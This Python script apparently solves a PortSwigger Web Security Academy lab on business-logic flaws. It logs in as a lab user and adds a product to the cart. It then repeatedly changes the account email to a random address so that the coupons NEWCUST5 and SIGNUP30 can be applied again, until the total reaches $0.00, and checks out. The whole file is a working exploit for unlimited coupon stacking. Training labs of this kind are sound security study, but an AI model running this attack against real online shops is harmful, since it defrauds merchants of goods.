import requests
import re
import urllib3
import sys
import uuid
import math

proxies = {
    # "https": "http://127.0.0.1:8080"
}

session = requests.session()
session.proxies.update(proxies)
session.verify = False

def login(login_url) -> bool:

    global session

    response = session.get(login_url)
    content = response.content.decode()

    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)

    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }

    response = session.post(login_url, data=data, allow_redirects=False)

    assert response.status_code == 302 and response.headers['Location'] == "/my-account"


def add_item_to_cart(cart_url):

    global session

    data = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 1
    }

    response = session.post(cart_url, data=data, allow_redirects=False)
    content = response.content.decode()

    assert response.status_code == 302 and response.headers['Location'] == "/product?productId=1"


def update_email(account_url, change_email_url):

    global session

    response = session.get(account_url)
    content = response.content.decode()

    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)
    # print(csrf)

    random_email = f"{uuid.uuid4().hex}@test.local"

    data = {
        "email": random_email,
        "csrf": csrf
    }

    response = session.post(change_email_url, data=data, allow_redirects=False)
    content = response.content.decode()

    assert response.status_code == 302 and response.headers['Location'] == "/my-account"


def apply_coupon(cart_url, coupon_url, coupon):

    global session

    response = session.get(cart_url)
    content = response.content.decode()

    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)
    # print(csrf)

    data = {
        "csrf": csrf,
        "coupon": coupon
    }

    response = session.post(coupon_url, data=data, allow_redirects=False)
    content = response.content.decode()

    assert response.status_code == 302 and response.headers['Location'] == "/cart"


def checkout(cart_url, checkout_url):

    global session

    response = session.get(cart_url)
    content = response.content.decode()

    regex = r'<form class=login-form action=/cart/checkout method=POST>\s+<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)
    # print(csrf)

    data = {
        "csrf": csrf
    }

    response = session.post(checkout_url, data=data)
    content = response.content.decode()

    assert response.status_code == 200 and "Your order is on its way!" in content


def get_total_cost(cart_url):

    global session

    response = session.get(cart_url)
    content = response.content.decode()

    regex = r'<th>Total:</th>\s+<th>\$(.*)</th>'
    match = re.search(regex, content)

    assert match is not None
    total_cost = match.group(1)
    
    return total_cost

def main():

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    domain = "https://ac5d1f8b1f23b0a3c05b549e00c200db.web-security-academy.net"

    login_url = f"{domain}/login"
    cart_url = f"{domain}/cart"
    coupon_url = f"{domain}/cart/coupon"
    checkout_url = f"{domain}/cart/checkout"
    account_url = f"{domain}/my-account"
    change_email_url = f"{domain}/my-account/change-email"

    times = math.ceil((1337 - (1337 * 0.3)) / 5)

    login(login_url)
    print(f"[+] Logged in successfully")

    add_item_to_cart(cart_url)
    print(f"[+] Item added to the cart")

    total_cost = ""

    while total_cost != "0.00":
    
        update_email(account_url, change_email_url)

        apply_coupon(cart_url, coupon_url, 'NEWCUST5')
        apply_coupon(cart_url, coupon_url, 'SIGNUP30')
        
        total_cost = get_total_cost(cart_url)
        print(f"[+] Total cost: {total_cost}")
    
    checkout(cart_url, checkout_url)
    print(f"[+] Item bought")
    
if __name__ == '__main__':
    main()
